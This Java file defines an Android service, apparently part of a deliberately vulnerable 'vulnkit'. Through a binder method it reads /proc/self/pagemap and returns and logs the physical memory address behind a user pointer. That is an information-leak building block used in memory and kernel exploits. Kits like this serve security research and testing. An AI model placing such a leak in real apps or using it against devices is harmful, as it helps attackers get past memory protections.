package org.dpdns.sqxy090123.kit.vulnkit;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;

import java.io.RandomAccessFile;

public class PhysLeakService extends Service {
    private static final String TAG = "PhysLeakService";
    private static final int PAGE_SIZE = 4096;

    private final IPhysLeak.Stub binder = new IPhysLeak.Stub() {
        @Override
        public long leakPhysAddress(long userPtr) throws RemoteException {
            try {
                long page = userPtr / PAGE_SIZE;
                RandomAccessFile pagemap = new RandomAccessFile("/proc/self/pagemap", "r");
                pagemap.seek(page * 8);
                long entry = 0;
                for (int i = 0; i < 8; i++) {
                    entry |= ((long) pagemap.readUnsignedByte()) << (i * 8);
                }
                pagemap.close();

                if ((entry & (1L << 63)) == 0) {
                    Log.e(TAG, "Page not present");
                    return 0;
                }

                long pfn = entry & ((1L << 55) - 1);
                long phys = (pfn * PAGE_SIZE) | (userPtr & (PAGE_SIZE - 1));
                Log.i(TAG, "Leaked physical address: 0x" + Long.toHexString(phys));
                return phys;
            } catch (Exception e) {
                Log.e(TAG, "leakPhysAddress error", e);
                return 0;
            }
        }
    };

    @Override
    public IBinder onBind(Intent intent) {
        return binder;
    }
}